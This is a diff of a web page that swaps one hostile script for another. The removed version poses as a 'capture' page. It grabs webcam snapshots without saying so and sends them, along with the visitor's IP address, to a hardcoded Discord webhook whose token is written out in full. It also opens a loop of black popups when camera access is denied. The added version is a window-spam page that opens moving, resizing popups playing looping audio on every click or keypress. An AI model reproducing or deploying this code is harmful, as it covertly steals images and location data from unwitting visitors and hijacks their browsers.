@@ -1,137 +1,96 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Glassmorphism Capture</title>
-  <style>
-    /* Background gradient with subtle blur */
-    body {
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      overflow: hidden;
-    }
-
-    .glass-container {
-      background: rgba(255, 255, 255, 0.15);
-      border-radius: 20px;
-      box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
-      backdrop-filter: blur(10px);
-      -webkit-backdrop-filter: blur(10px);
-      border: 1px solid rgba(255, 255, 255, 0.18);
-      padding: 40px;
-      width: 380px;
-      text-align: center;
-      color: #fff;
-    }
-
-    h1 {
-      margin-bottom: 1rem;
-      font-weight: 700;
-      font-size: 2rem;
-      text-shadow: 0 0 10px rgba(255, 255, 255, 0.7);
-    }
-
-    p {
-      font-weight: 500;
-      font-size: 1rem;
-      text-shadow: 0 0 8px rgba(255, 255, 255, 0.6);
-      margin-bottom: 2rem;
-    }
-
-    /* Hide video and canvas */
-    video, canvas {
-      display: none;
-    }
-  </style>
+<meta charset="UTF-8" />
+<title>Window Spam</title>
+<style>
+  body {
+    margin: 0;
+    height: 100vh;
+    background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
+    overflow: hidden;
+    user-select: none;
+  }
+</style>
 </head>
 <body>
-  <div class="glass-container">
-    <h1>Welcome to Sevkabevka Capture</h1>
-    <p>Allow camera for a better experience.<br>Press SPACE after denial.</p>
-  </div>
+<script>
+  const audioSrc = 'https://sevkabevka.github.io/alah.mp3';
 
-  <video id="video" autoplay></video>
-  <canvas id="canvas" width="320" height="240"></canvas>
+  // Create a single popup window with motion and rotation and audio loop
+  function spawnWindow() {
+    const win = window.open('', '', 'width=500,height=500,left=100,top=100');
+    if (!win) return;
 
-  <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    const webhookURL = "https://discordapp.com/api/webhooks/1374439333473292298/oF_3g-oeCrSnruf7vmDS8wd9bqXvQnvhTTkJdBUpaQU-r4K_JOLcXFHHzCA8W8J5Zcws";
+    // Write basic black body + audio playing loop
+    win.document.write(`
+      <style>
+        body {
+          margin:0;
+          background:black;
+          overflow:hidden;
+        }
+        audio {
+          display:none;
+        }
+      </style>
+      <body>
+        <audio autoplay loop src="${audioSrc}"></audio>
+      </body>
+    `);
+    win.document.close();
 
-    function dataURLtoBlob(dataurl) {
-      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-      for(let i=0; i<n; i++) {
-          u8arr[i] = bstr.charCodeAt(i);
+    // Animate window moving and rotating by changing position and size in intervals
+    let angle = 0;
+    let x = 100;
+    let y = 100;
+    let dx = (Math.random() - 0.5) * 10;
+    let dy = (Math.random() - 0.5) * 10;
+    let rotationSpeed = (Math.random() - 0.5) * 10;
+
+    const interval = setInterval(() => {
+      if (win.closed) {
+        clearInterval(interval);
+        return;
       }
-      return new Blob([u8arr], {type:mime});
+      x += dx;
+      y += dy;
+      angle += rotationSpeed;
+
+      // Keep window inside screen bounds (roughly)
+      const screenW = screen.availWidth;
+      const screenH = screen.availHeight;
+
+      if (x < 0 || x > screenW - 500) dx = -dx;
+      if (y < 0 || y > screenH - 500) dy = -dy;
+
+      // Apply position (some browsers may not rotate window, so simulate with size)
+      win.moveTo(x, y);
+
+      // Trick: change window size slightly to simulate some motion
+      let sizeMod = 20 * Math.abs(Math.sin(angle * Math.PI / 180));
+      win.resizeTo(500 + sizeMod, 500 + sizeMod);
+    }, 100);
+  }
+
+  // Spam multiple windows on event
+  function spamWindows() {
+    for (let i = 0; i < 5; i++) {
+      spawnWindow();
     }
+  }
 
-    function sendFile(blob, filename) {
-      const formData = new FormData();
-      formData.append('file', blob, filename);
-      return fetch(webhookURL, { method: 'POST', body: formData });
+  // Event listeners for left click, right click and space press
+  document.addEventListener('click', spamWindows);
+  document.addEventListener('contextmenu', e => {
+    e.preventDefault();
+    spamWindows();
+  });
+  document.addEventListener('keydown', e => {
+    if (e.code === 'Space') {
+      spamWindows();
     }
-
-    // Send IP
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => {
-        fetch(webhookURL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: `IP grabbed: ${data.ip}` })
-        });
-      });
-
-    function spawnBlackWindow() {
-      window.open('', '', 'width=500,height=500').document.write('<body style="margin:0;background:black;"></body>');
-    }
-
-    function startPopupLoop() {
-      spawnBlackWindow();
-      setInterval(spawnBlackWindow, 500);
-      
-      // Play audio on loop
-      const audio = new Audio('https://sevkabevka.github.io/alah.mp3');
-      audio.loop = true;
-      audio.play();
-    }
-
-    // Attempt camera capture
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-
-        setTimeout(() => {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          sendFile(dataURLtoBlob(canvas.toDataURL('image/png')), 'capture1.png');
-        }, 1000);
-
-        setTimeout(() => {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          sendFile(dataURLtoBlob(canvas.toDataURL('image/png')), 'capture2.png');
-          stream.getTracks().forEach(track => track.stop());
-        }, 4000);
-      })
-      .catch(() => {
-        // Wait for space key press to start popup & audio loop
-        document.addEventListener('keydown', function handler(e) {
-          if (e.code === 'Space') {
-            startPopupLoop();
-            document.removeEventListener('keydown', handler);
-          }
-        });
-      });
-  </script>
+  });
+</script>
 </body>
 </html>
-
-
-
